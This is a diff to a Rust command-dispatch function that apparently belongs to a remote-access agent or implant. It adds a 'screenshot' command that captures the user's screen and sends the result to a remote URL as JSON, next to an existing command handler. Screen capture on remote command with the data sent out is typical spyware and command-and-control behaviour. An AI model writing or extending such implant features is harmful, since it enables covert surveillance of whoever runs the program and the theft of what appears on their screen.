@@ -5,6 +5,7 @@ use crate::{Response, Response2};
 use crate::requests;
 use crate::url;
 use reqwest::Method;
+use crate::screencapture;
 
 
 pub fn filter_command(message:&Value){
@@ -35,6 +36,23 @@ pub fn filter_command(message:&Value){
                         id:String::from(id)
                     };
                     requests::send_json_request(Method::GET, url, Some(&result_response));
+                    
+                }
+                else if command.starts_with("screenshot") {
+                    println!("the command is screenshot command {}", command);
+                    let (response, result) = screencapture::capture();
+                    let final_response = Response{
+                        response: response,
+                        id: String::from(id)
+                    };
+                    requests::send_json_request(Method::GET, url, Some(&final_response));
+                    let result_response = Response2{
+                        result: result,
+                        id: String::from(id)
+                    };
+                    requests::send_json_request(Method::GET, url, Some(&result_response));
+                } else {
+                    println!("Unknown command: {}", command);
                 }
             }
         }
